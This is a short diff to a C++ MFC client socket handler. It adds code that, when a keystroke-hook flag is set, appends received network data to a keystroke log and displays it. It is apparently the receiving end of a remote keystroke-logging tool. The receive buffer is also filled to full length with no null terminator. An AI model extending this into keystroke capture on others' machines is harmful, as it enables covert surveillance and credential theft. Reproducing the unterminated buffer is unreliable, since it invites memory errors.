@@ -23,8 +23,19 @@ CClientSocket::~CClientSocket()
 void CClientSocket::OnReceive(int nErrorCode)
 {
 	// TODO: Add your specialized code here and/or call the base class
-	char strRec[1024] = "";
-	Receive(strRec, 1024);
-	((CClientApp*)AfxGetApp())->m_pClientView->AddMsg(strRec);
+	char msg[1024] = "";
+	Receive(msg, 1024);
+	((CClientApp*)AfxGetApp())->m_pClientView->AddMsg(msg);
+
+
+	// Handle Keystroke process
+	if (((CClientApp*)AfxGetApp())->m_pClientView->m_dlgKSTR.m_isHooked == TRUE)
+	{
+		((CClientApp*)AfxGetApp())->m_pClientView->m_dlgKSTR.m_strAllKeystroke += msg;
+		((CClientApp*)AfxGetApp())->m_pClientView->m_dlgKSTR.m_strDisplay.SetWindowTextA(
+			((CClientApp*)AfxGetApp())->m_pClientView->m_dlgKSTR.m_strAllKeystroke);
+	}
+	
 	CSocket::OnReceive(nErrorCode);
+
 }
